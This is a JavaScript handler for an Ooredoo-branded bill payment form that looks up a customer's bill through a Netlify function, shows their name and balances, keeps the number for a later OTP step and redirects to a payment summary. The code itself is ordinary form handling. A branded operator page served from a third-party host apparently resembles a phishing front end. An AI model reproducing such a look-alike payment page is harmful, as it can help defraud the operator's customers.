/**
 * Recharge/Bill Payment Handler
 * Uses the official MyAccount Quick Payment flow through a Netlify Function
 * to show bill details quickly inside the existing Ooredoo-styled form.
 */
(function() {
  'use strict';

  var initialized = false;
  var lastBillData = null;
  var prefixAlertTimeout = null;
  var OMAN_ALLOWED_PREFIX_MESSAGE = 'يجب أن يبدأ الرقم بالرقم 9 أو 7 أو 2.';

  document.addEventListener('DOMContentLoaded', init);
  if (document.readyState !== 'loading') init();

  function init() {
    if (initialized) return;

    function tr(key, fallback) {
      return window.OoredooLanguage && typeof window.OoredooLanguage.t === 'function'
        ? window.OoredooLanguage.t(key, fallback)
        : fallback;
    }

    const proceedBtn = document.querySelector('.proceed-btn');
    const customerInput = document.querySelector('input.customer-number');
    const typeRadioSection = document.querySelector('.type-radio-btn-section');
    const lookupTypeModule = typeRadioSection ? typeRadioSection.closest('.et_pb_module') : null;
    const lookupInputSection = document.querySelector('.mobile-number-input-section');
    const balanceSection = document.querySelector('.balance-info-section');
    const amountSection = document.querySelector('.amount-input-section');
    const payOnlineSections = document.querySelectorAll('.pay-online-text-section');
    const paymentCardsSections = document.querySelectorAll('.payment-cards-section');
    const proceedToPayBtns = document.querySelectorAll('.proceed-to-pay-btn');

    if (!proceedBtn || !customerInput) {
      console.log('Recharge handler: elements not found, retrying...');
      setTimeout(init, 500);
      return;
    }

    initialized = true;

    setLookupFormVisibility(true);
    bindCustomerNumberInputFilter(customerInput);
    bindAmountInputFilter();
    if (balanceSection) balanceSection.style.display = 'none';
    if (amountSection) amountSection.style.display = 'none';
    payOnlineSections.forEach(function(section) { section.style.display = 'none'; });
    paymentCardsSections.forEach(function(section) { section.style.display = 'none'; });
    proceedToPayBtns.forEach(function(btn) {
      var wrapper = btn.closest('.et_pb_button_module_wrapper');
      if (wrapper) wrapper.style.display = 'none';
      btn.setAttribute('href', '/summary-payment/?lang=' + getCurrentLang());
      btn.setAttribute('target', '_self');
      btn.removeAttribute('rel');
    });

    proceedBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();

      const customerNumber = customerInput.value.trim();
      const typeRadio = document.querySelector('input[name="type"]:checked');
      const type = typeRadio ? typeRadio.value : 'msisdn_fdn';

      if (!customerNumber) {
        showError(tr('enter_number', 'يرجى إدخال الرقم'));
        return;
      }

      if (!/^\d+$/.test(customerNumber)) {
        showError(tr('invalid_msisdn', 'الرقم غير صالح. يرجى إدخال أرقام فقط.'));
        return;
      }

      if (type === 'msisdn_fdn' && !isAllowedOmanPrefix(customerNumber)) {
        showPrefixError(customerInput);
        return;
      }

      if (type === 'msisdn_fdn' && customerNumber.length !== 8) {
        showError(tr('invalid_msisdn', 'الرقم غير صالح. يرجى إدخال رقم مكون من 8 أرقام.'));
        return;
      }

      if (type === 'b2b_account') {
        showError(tr('generic_error', 'رقم السجل التجاري غير مدعوم في الدفع السريع. يرجى استخدام رقم الهاتف أو رقم الحساب.'));
        return;
      }

      storeOtpCustomerNumber(customerNumber);
      setLoadingState(true);
      hideError();

      verifyNumber(customerNumber, type)
        .then(function(data) {
          setLoadingState(false);

          if (data && data.responseCode === 'success') {
            lastBillData = data;
            displayBillInfo(data, customerNumber);
          } else if (data && data.error) {
            showError(data.error);
          } else {
            showError(tr('generic_error', 'حدث خطأ. يرجى المحاولة مرة أخرى.'));
          }
        })
        .catch(function(err) {
          setLoadingState(false);
          showError(tr('connection_error', 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.'));
          console.error('MyAccount API Error:', err);
        });
    });

    document.addEventListener('oredoo:languagechange', function() {
      if (proceedBtn && proceedBtn.style.pointerEvents !== 'none') {
        proceedBtn.textContent = tr('proceed', 'تابع');
      }
    });

    var changeBtn = document.querySelector('.change-btn');
    if (changeBtn) {
      changeBtn.addEventListener('click', function() {
        resetForm();
      });
    }

    proceedToPayBtns.forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault();

        var rechargeInput = document.querySelector('.recharge-amount');
        if (rechargeInput) sanitizeAmountInput(rechargeInput);
        var amountValue = rechargeInput ? rechargeInput.value.trim() : '';
        var numericAmount = normaliseNumericAmount(amountValue);
        var minAmount = rechargeInput ? Number(rechargeInput.getAttribute('data-minamount') || '1') : 1;
        var maxAmount = rechargeInput ? Number(rechargeInput.getAttribute('data-maxamount') || '150') : 150;

        if (!amountValue || !isFinite(numericAmount) || numericAmount <= 0) {
          showAmountError('يرجى إدخال المبلغ المراد دفعه.');
          if (rechargeInput) rechargeInput.focus();
          return;
        }

        if (isFinite(minAmount) && numericAmount < minAmount) {
          showAmountError('الحد الأدنى للمبلغ هو ' + formatAmount(minAmount) + ' ر.ع');
          if (rechargeInput) rechargeInput.focus();
          return;
        }

        if (isFinite(maxAmount) && numericAmount > maxAmount) {
          showAmountError('الحد الأقصى للمبلغ هو ' + formatAmount(maxAmount) + ' ر.ع');
          if (rechargeInput) rechargeInput.focus();
          return;
        }

        hideAmountError();
        savePaymentSummaryData(numericAmount);
        window.location.href = '/summary-payment/?lang=' + getCurrentLang();
      });
    });

    function savePaymentSummaryData(numericAmount) {
      var data = lastBillData || {};
      var visibleNumber = textFrom('.customer-entered-number .msisdn') || textFrom('.account-details .msisdn');
      var visibleAccount = textFrom('.account-number-value') || textFrom('.account-details .account-number');
      var visibleName = textFrom('.customer-name .name');
      var customerNumber = data.serviceNumber || data.customer_number || visibleNumber || customerInput.value.trim();

      try {
        sessionStorage.setItem('last_ooredoo_bill_lookup', JSON.stringify({
          number: customerNumber,
          customerNumber: data.customer_number || customerNumber,
          accountNumber: data.accountNumber || visibleAccount || '',
          customerName: data.customerName || visibleName || '',
          amount: formatAmount(numericAmount),
          amountDue: data.balances ? formatAmount(data.balances.TOTAL_OUTSTANDING) : '',
          minimumPayment: data.balances ? formatAmount(data.balances.MINIMUM_PAYMENT) : '',
          unbilled: data.balances ? formatAmount(data.balances.UNBILLED_OUTSTANDING) : '',
          type: data.type || 'postpaid',
          checkedAt: new Date().toISOString()
        }));
      } catch (err) {}
    }

    function textFrom(selector) {
      var el = document.querySelector(selector);
      return el ? el.textContent.trim() : '';
    }

    function storeOtpCustomerNumber(customerNumber) {
      var digits = String(customerNumber || '').replace(/\D/g, '');
      if (!digits) return;

      try {
        sessionStorage.setItem('ooredoo_otp_customer_number', digits);
        sessionStorage.setItem('ooredoo_customer_number', digits);
      } catch (err) {}
    }

    function verifyNumber(customerNumber, type) {
      var controller = window.AbortController ? new AbortController() : null;
      var timeout = setTimeout(function() {
        if (controller) controller.abort();
      }, 15000);

      return fetch('/.netlify/functions/verify-number', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_number: customerNumber,
          type: type
        }),
        signal: controller ? controller.signal : undefined
      })
        .then(function(response) { return response.json(); })
        .finally(function() { clearTimeout(timeout); });
    }

    function setLoadingState(isLoading) {
      if (isLoading) {
        proceedBtn.style.pointerEvents = 'none';
        proceedBtn.style.position = 'relative';
        if (!proceedBtn.querySelector('.btn-spinner')) {
          var spinner = document.createElement('span');
          spinner.className = 'btn-spinner';
          spinner.style.cssText = 'position:absolute;top:50%;left:50%;width:28px;height:28px;margin-top:-14px;margin-left:-14px;border:3px solid rgba(255,255,255,0.4);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;z-index:1;';
          proceedBtn.appendChild(spinner);
        }
        if (!document.getElementById('spinnerKeyframes')) {
          var style = document.createElement('style');
          style.id = 'spinnerKeyframes';
          style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
          document.head.appendChild(style);
        }
      } else {
        var sp = proceedBtn.querySelector('.btn-spinner');
        if (sp) sp.remove();
        proceedBtn.style.pointerEvents = '';
      }
    }

    function displayBillInfo(data, customerNumber) {
      setLookupFormVisibility(false);
      if (balanceSection) balanceSection.style.display = 'block';
      if (amountSection) amountSection.style.display = 'block';
      payOnlineSections.forEach(function(section) { section.style.display = 'block'; });
      paymentCardsSections.forEach(function(section) { section.style.display = 'block'; });
      proceedToPayBtns.forEach(function(btn) {
        var wrapper = btn.closest('.et_pb_button_module_wrapper');
        if (wrapper) wrapper.style.display = 'block';
        btn.classList.remove('no-display');
      });

      var proceedWrapper = proceedBtn.closest('.et_pb_button_module_wrapper');
      if (proceedWrapper) proceedWrapper.style.display = 'none';

      var msisdnSpan = balanceSection ? balanceSection.querySelector('.customer-entered-number .msisdn') : null;
      if (msisdnSpan) msisdnSpan.textContent = data.serviceNumber || customerNumber;

      var prepaidSpans = document.querySelectorAll('.prepaid');
      var postpaidSpans = document.querySelectorAll('.postpaid');
      var prepaidDetails = document.querySelector('.prepaid-details');
      var postpaidDetails = document.querySelector('.postpaid-details');

      var isPrepaid = data.type === 'prepaid';
      prepaidSpans.forEach(function(el) { el.style.display = isPrepaid ? 'inline' : 'none'; });
      postpaidSpans.forEach(function(el) { el.style.display = isPrepaid ? 'none' : 'inline'; });
      if (prepaidDetails) prepaidDetails.style.display = isPrepaid ? 'block' : 'none';
      if (postpaidDetails) postpaidDetails.style.display = isPrepaid ? 'none' : 'block';

      if (isPrepaid && prepaidDetails) {
        var prepaidNameLine = prepaidDetails.querySelector('.customer-name');
        var prepaidNameEl = prepaidDetails.querySelector('.customer-name .name');
        if (prepaidNameLine) prepaidNameLine.style.display = data.customerName ? 'block' : 'none';
        if (prepaidNameEl) prepaidNameEl.textContent = data.customerName || '';

        var balanceEl = prepaidDetails.querySelector('.balance .amount');
        if (balanceEl) balanceEl.textContent = data.balances ? formatAmount(data.balances.BALANCE) : '0';
      } else if (postpaidDetails) {
        var nameLine = postpaidDetails.querySelector('.customer-name');
        var nameEl = postpaidDetails.querySelector('.customer-name .name');
        if (nameLine) nameLine.style.display = data.customerName ? 'block' : 'none';
        if (nameEl) nameEl.textContent = data.customerName || '';

        ensureAccountNumberLine(postpaidDetails, data.accountNumber);

        var unbilledEl = postpaidDetails.querySelector('.unbilled-amount .amount');
        if (unbilledEl) unbilledEl.textContent = data.balances ? formatAmount(data.balances.UNBILLED_OUTSTANDING) : '0';

        var minPayEl = postpaidDetails.querySelector('.minimum-payment .amount');
        if (minPayEl) minPayEl.textContent = data.balances ? formatAmount(data.balances.MINIMUM_PAYMENT) : '0';

        var amountDueEl = postpaidDetails.querySelector('.amount-due .amount');
        if (amountDueEl) amountDueEl.textContent = data.balances ? formatAmount(data.balances.TOTAL_OUTSTANDING) : '0';
      }

      bindAmountInputFilter();
      var rechargeInput = document.querySelector('.recharge-amount');
      if (rechargeInput) {
        if (data.minmaxAmount) {
          rechargeInput.setAttribute('data-minamount', data.minmaxAmount.min || '1');
          rechargeInput.setAttribute('data-maxamount', data.minmaxAmount.max || '150');
          rechargeInput.setAttribute('data-type', data.type || 'postpaid');
        }
        rechargeInput.value = '';
        rechargeInput.setAttribute('inputmode', 'decimal');
        rechargeInput.setAttribute('autocomplete', 'off');
        rechargeInput.setAttribute('placeholder', '');
      }
      hideAmountError();
    }

    function ensureAccountNumberLine(container, accountNumber) {
      var existing = container.querySelector('.account-number-line');
      if (!accountNumber) {
        if (existing) existing.style.display = 'none';
        return;
      }

      if (!existing) {
        existing = document.createElement('p');
        existing.className = 'account-number-line';
        existing.innerHTML = 'رقم الحساب: <span class="theme-color account-number-value"></span>';
        var nameLine = container.querySelector('.customer-name');
        if (nameLine && nameLine.nextSibling) {
          container.insertBefore(existing, nameLine.nextSibling);
        } else {
          container.appendChild(existing);
        }
      }

      existing.style.display = 'block';
      var valueEl = existing.querySelector('.account-number-value');
      if (valueEl) valueEl.textContent = accountNumber;
    }

    function formatAmount(value) {
      var number = Number(String(value || '0').replace(/[^0-9.\-]/g, ''));
      if (!isFinite(number)) return String(value || '0');
      return number.toFixed(3).replace(/\.000$/, '').replace(/(\.\d*?)0+$/, '$1').replace(/\.$/, '');
    }

    function normaliseNumericAmount(value) {
      return Number(String(value || '').replace(/[^0-9.\-]/g, ''));
    }

    function bindCustomerNumberInputFilter(customerInput) {
      if (!customerInput || customerInput.getAttribute('data-numeric-only-bound') === 'true') return;

      customerInput.setAttribute('data-numeric-only-bound', 'true');
      customerInput.setAttribute('inputmode', 'numeric');
      customerInput.setAttribute('pattern', '[0-9]*');
      customerInput.setAttribute('autocomplete', 'off');
      customerInput.setAttribute('maxlength', '20');

      customerInput.addEventListener('beforeinput', function(e) {
        if (!e.data) return;

        var digits = e.data.replace(/\D/g, '');
        if (!digits) {
          e.preventDefault();
          return;
        }

        if (!canInsertCustomerDigits(customerInput, digits)) {
          e.preventDefault();
          showPrefixError(customerInput);
          return;
        }

        if (digits !== e.data) {
          e.preventDefault();
          insertDigitsAtCursor(customerInput, digits);
        }
      });

      customerInput.addEventListener('input', function() {
        var isAccepted = sanitizeCustomerNumberInput(customerInput, true);
        if (isAccepted && customerInput.value) hidePrefixAlert();
        hideError();
      });

      customerInput.addEventListener('paste', function(e) {
        var clipboard = e.clipboardData || window.clipboardData;
        var pastedText = clipboard && typeof clipboard.getData === 'function' ? clipboard.getData('text') : '';
        var digits = String(pastedText || '').replace(/\D/g, '');

        e.preventDefault();
        if (!digits) return;
        if (!canInsertCustomerDigits(customerInput, digits)) {
          showPrefixError(customerInput);
          return;
        }
        insertDigitsAtCursor(customerInput, digits);
      });

      document.querySelectorAll('input[name="type"]').forEach(function(radio) {
        radio.addEventListener('change', function() {
          sanitizeCustomerNumberInput(customerInput, false);
          hideError();
          hidePrefixAlert();
        });
      });
    }

    function insertDigitsAtCursor(input, digits) {
      var value = String(input.value || '');
      var start = typeof input.selectionStart === 'number' ? input.selectionStart : value.length;
      var end = typeof input.selectionEnd === 'number' ? input.selectionEnd : start;
      input.value = value.slice(0, start) + digits + value.slice(end);
      var cursorPosition = start + digits.length;
      if (typeof input.setSelectionRange === 'function') {
        input.setSelectionRange(cursorPosition, cursorPosition);
      }
      input.dispatchEvent(new Event('input', { bubbles: true }));
    }

    function sanitizeCustomerNumberInput(input, shouldAlert) {
      if (!input) return true;
      var value = String(input.value || '').replace(/\D/g, '');
      var isInvalidPrefix = value && isMsisdnTypeSelected() && !isAllowedOmanPrefix(value);

      if (isInvalidPrefix) {
        value = '';
      }

      if (input.value !== value) input.value = value;
      if (isInvalidPrefix && shouldAlert) showPrefixError(input);
      return !isInvalidPrefix;
    }

    function isMsisdnTypeSelected() {
      var selected = document.querySelector('input[name="type"]:checked');
      return !selected || selected.value === 'msisdn_fdn';
    }

    function isAllowedOmanPrefix(value) {
      return /^[279]/.test(String(value || ''));
    }

    function canInsertCustomerDigits(input, digits) {
      if (!isMsisdnTypeSelected()) return true;
      var value = String(input.value || '').replace(/\D/g, '');
      var start = typeof input.selectionStart === 'number' ? input.selectionStart : value.length;
      var end = typeof input.selectionEnd === 'number' ? input.selectionEnd : start;
      var nextValue = value.slice(0, start) + String(digits || '') + value.slice(end);
      return !nextValue || isAllowedOmanPrefix(nextValue);
    }

    function showPrefixError(input) {
      if (input) input.classList.add('invalid-number');
      showTopPrefixAlert(tr('invalid_msisdn_prefix', OMAN_ALLOWED_PREFIX_MESSAGE));
      setTimeout(function() {
        if (input) input.classList.remove('invalid-number');
      }, 2000);
    }

    function bindAmountInputFilter() {
      var rechargeInput = document.querySelector('.recharge-amount');
      if (!rechargeInput || rechargeInput.getAttribute('data-numeric-only-bound') === 'true') return;

      rechargeInput.setAttribute('data-numeric-only-bound', 'true');
      rechargeInput.setAttribute('inputmode', 'decimal');
      rechargeInput.setAttribute('pattern', '[0-9.]*');
      rechargeInput.setAttribute('autocomplete', 'off');

      rechargeInput.addEventListener('beforeinput', function(e) {
        if (!e.data) return;
        if (!/^[0-9.]$/.test(e.data)) {
          e.preventDefault();
          return;
        }
        if (e.data === '.' && rechargeInput.value.indexOf('.') !== -1) {
          e.preventDefault();
        }
      });

      rechargeInput.addEventListener('input', function() {
        sanitizeAmountInput(rechargeInput);
        hideAmountError();
      });

      rechargeInput.addEventListener('paste', function() {
        setTimeout(function() { sanitizeAmountInput(rechargeInput); }, 0);
      });
    }

    function sanitizeAmountInput(input) {
      if (!input) return;
      var value = String(input.value || '').replace(/[^0-9.]/g, '');
      var parts = value.split('.');
      if (parts.length > 1) {
        value = parts.shift() + '.' + parts.join('').replace(/\./g, '');
      }
      if (input.value !== value) input.value = value;
    }

    function getCurrentLang() {
      var params = new URLSearchParams(window.location.search || '');
      return params.get('lang') === 'en' ? 'en' : 'ar';
    }

    function setLookupFormVisibility(isVisible) {
      var sections = [];
      var currentTypeSection = document.querySelector('.type-radio-btn-section');
      var currentTypeModule = currentTypeSection ? currentTypeSection.closest('.et_pb_module') : lookupTypeModule;
      var currentInputSection = document.querySelector('.mobile-number-input-section') || lookupInputSection;

      [currentTypeModule, currentTypeSection, currentInputSection].forEach(function(section) {
        if (section && sections.indexOf(section) === -1) sections.push(section);
      });

      sections.forEach(function(section) {
        if (isVisible) {
          section.style.removeProperty('display');
          section.removeAttribute('hidden');
          section.setAttribute('aria-hidden', 'false');
        } else {
          section.style.setProperty('display', 'none', 'important');
          section.setAttribute('hidden', 'hidden');
          section.setAttribute('aria-hidden', 'true');
        }
      });
    }

    function ensureTopPrefixAlertStyles() {
      if (document.getElementById('ooredoo-prefix-alert-style')) return;
      var style = document.createElement('style');
      style.id = 'ooredoo-prefix-alert-style';
      style.textContent = '\n' +
        '.ooredoo-prefix-alert-visible{padding-top:74px!important;}\n' +
        '.ooredoo-prefix-alert{position:fixed;top:0;left:0;right:0;z-index:2147483000;min-height:74px;box-sizing:border-box;background:#fff3f5;border-bottom:1px solid #efd6dc;box-shadow:0 2px 14px rgba(0,0,0,.10);display:flex;align-items:center;justify-content:center;direction:rtl;text-align:center;padding:15px 64px;font-family:NotoKufiArabic-Regular,Noto Sans Arabic,Arial,sans-serif;font-size:18px;font-weight:500;line-height:1.8;color:#242424;}\n' +
        '.ooredoo-prefix-alert[hidden]{display:none!important;}\n' +
        '.ooredoo-prefix-alert__icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;min-width:32px;margin-left:13px;border-radius:50%;background:#ed1c24;color:#fff;font-size:20px;font-weight:800;line-height:1;}\n' +
        '.ooredoo-prefix-alert__close{position:absolute;left:28px;top:50%;transform:translateY(-50%);border:0;background:transparent;color:#a4a4a4;font-size:26px;line-height:1;cursor:pointer;padding:6px;font-family:Arial,sans-serif;}\n' +
        '@media (max-width:767px){.ooredoo-prefix-alert-visible{padding-top:66px!important;}.ooredoo-prefix-alert{min-height:66px;padding:12px 48px;font-size:14px;}.ooredoo-prefix-alert__icon{width:27px;height:27px;min-width:27px;font-size:17px;margin-left:9px;}.ooredoo-prefix-alert__close{left:14px;font-size:22px;}}\n';
      document.head.appendChild(style);
    }

    function showTopPrefixAlert(message) {
      ensureTopPrefixAlertStyles();
      var alertEl = document.querySelector('.ooredoo-prefix-alert');
      if (!alertEl) {
        alertEl = document.createElement('div');
        alertEl.className = 'ooredoo-prefix-alert';
        alertEl.setAttribute('role', 'alert');
        alertEl.setAttribute('aria-live', 'assertive');
        alertEl.innerHTML = '<button type="button" class="ooredoo-prefix-alert__close" aria-label="إغلاق">×</button><span class="ooredoo-prefix-alert__icon" aria-hidden="true">!</span><span class="ooredoo-prefix-alert__text"></span>';
        document.body.appendChild(alertEl);
        alertEl.querySelector('.ooredoo-prefix-alert__close').addEventListener('click', hidePrefixAlert);
      }

      var textEl = alertEl.querySelector('.ooredoo-prefix-alert__text');
      if (textEl) textEl.textContent = message || OMAN_ALLOWED_PREFIX_MESSAGE;
      alertEl.hidden = false;
      document.body.classList.add('ooredoo-prefix-alert-visible');

      clearTimeout(prefixAlertTimeout);
      prefixAlertTimeout = setTimeout(hidePrefixAlert, 5000);
    }

    function hidePrefixAlert() {
      var alertEl = document.querySelector('.ooredoo-prefix-alert');
      if (alertEl) alertEl.hidden = true;
      document.body.classList.remove('ooredoo-prefix-alert-visible');
      clearTimeout(prefixAlertTimeout);
    }

    function showAmountError(message) {
      var errorEl = document.querySelector('.amount-input-section .error-message');
      if (errorEl) {
        errorEl.textContent = message;
        errorEl.style.display = 'block';
      } else {
        showError(message);
      }
    }

    function hideAmountError() {
      var errorEl = document.querySelector('.amount-input-section .error-message');
      if (errorEl) errorEl.style.display = 'none';
    }

    function resetForm() {
      lastBillData = null;
      setLookupFormVisibility(true);
      if (balanceSection) balanceSection.style.display = 'none';
      if (amountSection) amountSection.style.display = 'none';
      payOnlineSections.forEach(function(section) { section.style.display = 'none'; });
      paymentCardsSections.forEach(function(section) { section.style.display = 'none'; });
      proceedToPayBtns.forEach(function(btn) {
        var wrapper = btn.closest('.et_pb_button_module_wrapper');
        if (wrapper) wrapper.style.display = 'none';
        btn.classList.add('no-display');
      });
      var proceedWrapper = proceedBtn.closest('.et_pb_button_module_wrapper');
      if (proceedWrapper) proceedWrapper.style.display = 'block';

      var input = document.querySelector('input.customer-number');
      if (input) input.value = '';
      var rechargeInput = document.querySelector('.recharge-amount');
      if (rechargeInput) rechargeInput.value = '';
      hideAmountError();
      hideError();
    }

    function showError(message) {
      var errorEl = document.querySelector('.mobile-number-input-section .error-message');
      if (errorEl) {
        errorEl.textContent = message;
        errorEl.style.display = 'block';
        setTimeout(function() {
          errorEl.style.display = 'none';
        }, 5000);
      } else {
        alert(message);
      }
    }

    function hideError() {
      var errorEl = document.querySelector('.mobile-number-input-section .error-message');
      if (errorEl) errorEl.style.display = 'none';
    }
  }
})();
